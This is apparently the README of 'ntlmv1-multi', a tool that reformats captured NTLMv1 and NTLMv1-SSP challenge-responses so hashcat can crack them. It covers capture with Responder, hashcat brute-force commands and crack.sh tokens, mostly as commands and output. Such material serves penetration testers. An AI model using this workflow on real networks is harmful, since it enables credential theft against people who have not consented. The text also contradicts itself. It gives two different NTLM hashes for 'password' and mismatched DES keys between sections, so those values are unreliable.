# Dec 10, 2019 Updates
Yes this is supposedly python 3 compatible, I will likely merge the tools into one in the new year, but until then the mods have not been extensively tested but should work.

# ntlmv1-multi
NTLMv1 Multitool

This tool modifies NTLMv1/NTLMv1-ESS/MSCHAPv2 hashes so they can be cracked with DES Mode 14000 in hashcat

This tool is based on work done by atom of team Hashcat https://hashcat.net/forum/thread-5832.html

It is also based on https://hashcat.net/forum/thread-5912.html and https://www.youtube.com/watch?v=LIHACAct2vo

# Usage

## NTLMv1 without SSP
To capture use responder with the --lm flag, without --lm you will activate SSP which requires a different tool.

The capture will look like this.
```
[SMB] NTLMv1 Client   : 184.64.60.62
[SMB] NTLMv1 Username : DUSTIN-5AA37877\hashcat
[SMB] NTLMv1 Hash     : hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
[*] Skipping previously captured hash for DUSTIN-5AA37877\hashcat
```

The hash portion looks like this
```
hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

So use the multi tool like so
```
python ntlmv1.py --nossp hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

It will output the following data without modifing server challenges etc
```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Now the first and most important thing is the password used in this case is "password" and we can verify the ntlm hash with
```
echo -n password | iconv -f utf8 -t utf16le | openssl dgst -md4
(stdin)= 8846f7eaee8fb117ad06bdd830b7586c
```

With hashcat utils ct3_to_ntlm.bin that atom wrote you can calculate the last 4 characters of the NTLM hash from the NTLMv1 challenge, which the tool outputs
```
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
568c
```

This matches up to the end of the ntlm hash so we are good to go, the next step is cracking the hashes with hashcat so we need to make a hashes.txt file with
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

To crack this with hashcat you use
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

If you are just testing my code and know the password already you can use the des converter
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Basically you do the following
```
echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
```
./hashcat -m 14000 -a 0 -1 charsets/DES_full.charset --hex-charset hashes.txt des.cand
```

And you should have some reversed hashes

## NTLMv1 with SSP
SSP changes the server challenge, if you see SSP in your responder because you didn't use --lm or the client is set not to give out a LM response then SSP gets engaged.

The SSP output looks like this
```
[SMB] NTLMv1-SSP Client   : 184.64.60.62
[SMB] NTLMv1-SSP Username : DUSTIN-5AA37877\hashcat
[SMB] NTLMv1-SSP Hash     : hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788
```

The actual hash looks like this
```
hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788
```

The hashcat forums post do not use SSP, so don't try to use the SSP on *NON* SSP hashes, you will see a stackload of zero's and thats how you can tell as the LM Response is mangled.

To use the tool run
```
python ntlmv1-ssp.py --ssp "hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788"
```

The tool will output
```
Hashfield Split:
['hashcat', '', 'DUSTIN-5AA37877', '85D5BC2CE95161CD00000000000000000000000000000000', '892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
LM Response: 85D5BC2CE95161CD00000000000000000000000000000000
NT Response: 892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0
Client Challenge: 1122334455667788
SRV Challenge: b36d2b9a8607ea77

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin 2BBD6C9ABCD021D0 1122334455667788 85D5BC2CE95161CD00000000000000000000000000000000

To crack with hashcat create a file with the following contents:
892F905962F76D32:b36d2b9a8607ea77
3837F613F88DE27C:b36d2b9a8607ea77

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Now the password we are using in this case is password which has and ntlm hash of ```b4b9b02e6f09a9bd760f388b67351e2b```
```
echo -n password | iconv -f utf8 -t utf16le | openssl dgst -md4
(stdin)= 8846f7eaee8fb117ad06bdd830b7586c
```

So to calculate the last 4 characters of the ntlm hash for our NTLMv1-SSP chalenge we use the following command from the tool output to get ```586c```
```
./ct3_to_ntlm.bin 2BBD6C9ABCD021D0 1122334455667788 85D5BC2CE95161CD00000000000000000000000000000000
```

We must make a hash file with the following content according to the tool which has the modified SRV Challenges to deal with ESS
```
892F905962F76D32:b36d2b9a8607ea77
3837F613F88DE27C:b36d2b9a8607ea77
```

To crack with hashcat we use the following according to the tool
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Now assuming we already knew what the ntlm hash was in the case because we made it and want to validate the tooling we use the following
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
```

This will output some data for us
```
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

The important part here is
```
echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Now we can crack with hashcat using the following and not waiting 8 days
```
./hashcat -m 14000 -a 0 -1 charsets/DES_full.charset --hex-charset hashes.txt des.cand
```

### crack.sh
A new update, crack.sh token generation will be appended to all ssp requests

```
To Crack with crack.sh use the following token
$NETLM$b36d2b9a8607ea77$892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0
```

## NTLM hash to DES Key Converter for data validation testing
```
python ntlm-to-des.py  --ntlm 8846f7eaee8fb117ad06bdd830b7586c
```
```
DESKEY1: b55d6d05e6792652
DESKEY2: bdba82e6895a9d6a

echo b55d6d05e6792652>>des.cand
echo bdba82e6895a9d6a>>des.cand
```
